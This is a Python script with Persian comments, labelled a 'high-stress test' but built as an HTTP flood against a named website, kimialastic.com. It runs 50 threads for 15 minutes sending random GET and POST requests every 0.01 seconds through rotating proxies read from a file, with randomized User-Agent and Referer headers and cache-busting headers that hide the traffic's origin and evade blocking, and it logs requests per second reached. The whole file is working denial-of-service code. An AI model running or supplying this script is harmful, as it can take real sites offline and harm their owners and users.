import requests
import random
import time
import threading
import logging
from datetime import datetime, timedelta

# --- تنظیمات اسکریپت برای فشار حداکثری در زمان کوتاه ---
TARGET_URL = "https://kimialastic.com/"  # آدرس سایت هدف شما
PROXY_FILE = "working_proxies.txt"      # نام فایل حاوی پروکسی‌های سالم
ATTACK_DURATION_MINUTES = 15             # مدت زمان تست (به دقیقه) - برای تست کوتاه
MAX_THREADS = 50                        # تعداد نخ‌ها (با توجه به پروکسی و سیستم، با احتیاط تنظیم شود)
REQUEST_TIMEOUT = 3                     # زمان انتظار برای هر درخواست (ثانیه) - کوتاه برای سرعت بالا
REQUEST_INTERVAL_PER_THREAD = 0.01      # حداقل فاصله زمانی بین درخواست‌ها برای هر نخ (ثانیه) - بسیار کم
LOG_FILE = "high_stress_test_log.txt"   # فایل برای ذخیره لاگ‌های دقیق‌تر
VERIFY_SSL = True                       # برای امنیت SSL (اگر سرور شما گواهی self-signed دارد، False کنید)

# --- تنظیمات لاگ‌گیری ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(threadName)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, mode='w'),
        logging.StreamHandler()
    ]
)

# --- لیست User-Agent و Referer ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    # ... (می‌توانید لیست را طولانی‌تر کنید)
]
REFERERS = [
    "https://www.google.com", "https://www.bing.com", TARGET_URL
    # ... (می‌توانید لیست را طولانی‌تر کنید)
]

# --- متغیرهای سراسری برای آمار ---
total_requests_attempted = 0
successful_requests = 0 # درخواست‌هایی که به سرور رسیده و کد 2xx یا 3xx دریافت کرده‌اند
failed_requests_connection_error = 0
failed_requests_timeout = 0
failed_requests_http_error = 0 # خطاهای HTTP از سمت سرور (4xx, 5xx)
stats_lock = threading.Lock()

def load_proxies(filename):
    loaded_proxies = []
    try:
        with open(filename, "r") as f:
            for line in f:
                proxy = line.strip()
                if proxy:
                    if not proxy.startswith("http://") and not proxy.startswith("https://"):
                        loaded_proxies.append(f"http://{proxy}")
                    else:
                        loaded_proxies.append(proxy)
        if not loaded_proxies:
            logging.error(f"هیچ پروکسی در فایل '{filename}' یافت نشد.")
            return []
        logging.info(f"تعداد {len(loaded_proxies)} پروکسی از فایل '{filename}' خوانده شد.")
        return loaded_proxies
    except FileNotFoundError:
        logging.error(f"فایل پروکسی '{filename}' یافت نشد.")
        return []
    except Exception as e:
        logging.error(f"خطا در خواندن فایل پروکسی: {e}")
        return []

def send_request_via_proxy(proxy_url, target_url):
    global total_requests_attempted, successful_requests
    global failed_requests_connection_error, failed_requests_timeout, failed_requests_http_error

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", # می‌توانید "fa-IR,fa;q=0.9" را هم اضافه کنید
        "Connection": "keep-alive", # یا "close"
        "Cache-Control": "no-cache", "Pragma": "no-cache"
    }
    proxies_dict = {"http": proxy_url, "https": proxy_url}
    method = random.choice(["GET", "POST"])

    request_successful_flag = False # برای شمارش دقیق‌تر درخواست‌های رسیده به سرور

    try:
        # logging.debug(f"ارسال {method} به {target_url} با {proxy_url}") # برای لاگ کمتر، این را کامنت می‌کنیم
        if method == "GET":
            response = requests.get(target_url, proxies=proxies_dict, headers=headers, timeout=REQUEST_TIMEOUT, verify=VERIFY_SSL)
        else: # POST
            post_data = {f"field_{random.randint(1,3)}": f"data_{random.randint(1,100)}"}
            response = requests.post(target_url, proxies=proxies_dict, headers=headers, data=post_data, timeout=REQUEST_TIMEOUT, verify=VERIFY_SSL)
        
        request_successful_flag = True # اگر به اینجا برسد، یعنی پاسخی از سرور (حتی خطا) دریافت شده

        with stats_lock:
            if 200 <= response.status_code < 400: # کدهای 2xx و 3xx را موفق در نظر می‌گیریم
                successful_requests += 1
                # logging.info(f"موفق: {method} {proxy_url} -> {response.status_code}") # لاگ برای هر موفقیت می‌تواند زیاد باشد
            else: # کدهای 4xx, 5xx
                failed_requests_http_error += 1
                logging.warning(f"خطای HTTP از سرور: {method} با {proxy_url} به {target_url} - کد: {response.status_code}")

    except requests.exceptions.Timeout:
        with stats_lock:
            failed_requests_timeout += 1
        # logging.warning(f"Timeout: {method} با {proxy_url}") # لاگ برای هر timeout می‌تواند زیاد باشد
    except requests.exceptions.ProxyError as e:
        with stats_lock:
            failed_requests_connection_error += 1
        logging.debug(f"خطای پروکسی: {proxy_url} - {e}") # این خطاها مربوط به خود پروکسی است
    except requests.exceptions.RequestException as e: # سایر خطاهای اتصال، SSL و ...
        with stats_lock:
            failed_requests_connection_error += 1
        logging.debug(f"خطای اتصال/درخواست: {proxy_url} - {e}")
    except Exception as e:
        logging.critical(f"خطای ناشناخته بحرانی با {proxy_url}: {e}", exc_info=False) # exc_info=False برای لاگ کمتر
    finally:
        with stats_lock:
            total_requests_attempted += 1


def worker_thread(proxies_list, target_url, end_time):
    while datetime.now() < end_time:
        if not proxies_list:
            break
        proxy = random.choice(proxies_list)
        send_request_via_proxy(proxy, target_url)
        if REQUEST_INTERVAL_PER_THREAD > 0:
            time.sleep(REQUEST_INTERVAL_PER_THREAD)
    # logging.info("نخ کارگر خاتمه یافت.")


if __name__ == "__main__":
    logging.info(f"--- شروع تست فشار بالا برای {TARGET_URL} ---")
    logging.info(f"مدت زمان تست: {ATTACK_DURATION_MINUTES} دقیقه")
    logging.info(f"تعداد نخ‌ها: {MAX_THREADS}")
    logging.info(f"Timeout درخواست: {REQUEST_TIMEOUT} ثانیه")
    logging.info(f"فاصله درخواست هر نخ: {REQUEST_INTERVAL_PER_THREAD} ثانیه")
    logging.info(f"بررسی SSL: {VERIFY_SSL}")

    working_proxies = load_proxies(PROXY_FILE)

    if not working_proxies:
        logging.critical("لیست پروکسی خالی است. خاتمه اسکریپت.")
        exit()

    attack_duration_seconds = ATTACK_DURATION_MINUTES * 60
    start_time_obj = datetime.now()
    end_time_obj = start_time_obj + timedelta(seconds=attack_duration_seconds)

    logging.info(f"زمان شروع: {start_time_obj.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.info(f"زمان مورد انتظار پایان: {end_time_obj.strftime('%Y-%m-%d %H:%M:%S')}")

    threads = []
    for i in range(MAX_THREADS):
        thread = threading.Thread(target=worker_thread, args=(working_proxies, TARGET_URL, end_time_obj), name=f"Worker-{i+1}")
        threads.append(thread)
        thread.start()

    try:
        # نمایش آمار به صورت دوره‌ای
        while datetime.now() < end_time_obj:
            time.sleep(10) # هر ۱۰ ثانیه آمار را نمایش بده
            with stats_lock:
                if total_requests_attempted > 0:
                    current_rps = total_requests_attempted / (datetime.now() - start_time_obj).total_seconds()
                    logging.info(
                        f"آمار جاری: تلاش‌ها={total_requests_attempted}, موفق (سرور پاسخ داد)={successful_requests + failed_requests_http_error}, "
                        f"Timeout={failed_requests_timeout}, خطای اتصال/پروکسی={failed_requests_connection_error}, "
                        f"خطای HTTP سرور={failed_requests_http_error}, RPS تقریبی={current_rps:.2f}"
                    )
                if not any(t.is_alive() for t in threads): # اگر همه تردها مردند
                    logging.warning("همه نخ‌های کارگر متوقف شده‌اند.")
                    break
        
        logging.info("زمان تست به پایان رسیده یا همه نخ‌ها متوقف شده‌اند. منتظر اتمام نهایی نخ‌ها...")
        for thread in threads:
            thread.join(timeout=REQUEST_TIMEOUT + 1) # فرصت برای بسته شدن تمیز

    except KeyboardInterrupt:
        logging.warning("توقف اسکریپت توسط کاربر (Ctrl+C).")
        # end_time را به گذشته تغییر می‌دهیم تا نخ‌ها سریعتر متوقف شوند
        end_time_obj = datetime.now() 
        for thread in threads:
            thread.join(timeout=REQUEST_TIMEOUT)

    logging.info("--- پایان تست فشار بالا ---")

    # --- نمایش آمار نهایی ---
    duration_actual = (datetime.now() - start_time_obj).total_seconds()
    logging.info(f"مدت زمان واقعی تست: {duration_actual:.2f} ثانیه")
    logging.info(f"کل درخواست‌های تلاش شده: {total_requests_attempted}")
    
    # درخواست‌هایی که حداقل پاسخی از سرور دریافت کرده‌اند (موفق یا خطای HTTP)
    requests_reached_server = successful_requests + failed_requests_http_error
    logging.info(f"تعداد درخواست‌هایی که به سرور رسیدند (پاسخ دریافت شد): {requests_reached_server}")
    logging.info(f"  - درخواست‌های موفق (کد 2xx, 3xx): {successful_requests}")
    logging.info(f"  - خطاهای HTTP از سرور (کد 4xx, 5xx): {failed_requests_http_error}")
    
    logging.info(f"خطاهای Timeout (پروکسی/شبکه پاسخ نداد): {failed_requests_timeout}")
    logging.info(f"خطاهای اتصال/پروکسی (قبل از رسیدن به سرور): {failed_requests_connection_error}")

    if total_requests_attempted > 0:
        # نرخ موفقیت بر اساس درخواست‌هایی که به سرور رسیدند و موفق بودند
        if requests_reached_server > 0 :
             actual_success_rate = (successful_requests / requests_reached_server) * 100
             logging.info(f"درصد موفقیت درخواست‌های رسیده به سرور: {actual_success_rate:.2f}%")
        
        overall_attempt_success_rate = (successful_requests / total_requests_attempted) * 100
        logging.info(f"درصد موفقیت از کل تلاش‌ها: {overall_attempt_success_rate:.2f}%")
        
        if duration_actual > 0:
            avg_rps_attempted = total_requests_attempted / duration_actual
            avg_rps_reached_server = requests_reached_server / duration_actual
            logging.info(f"متوسط RPS (تلاش شده): {avg_rps_attempted:.2f}")
            logging.info(f"متوسط RPS (رسیده به سرور): {avg_rps_reached_server:.2f}")
    else:
        logging.info("هیچ درخواستی ارسال نشد.")
    
    logging.info(f"لاگ‌های کامل در فایل '{LOG_FILE}' ذخیره شد.")
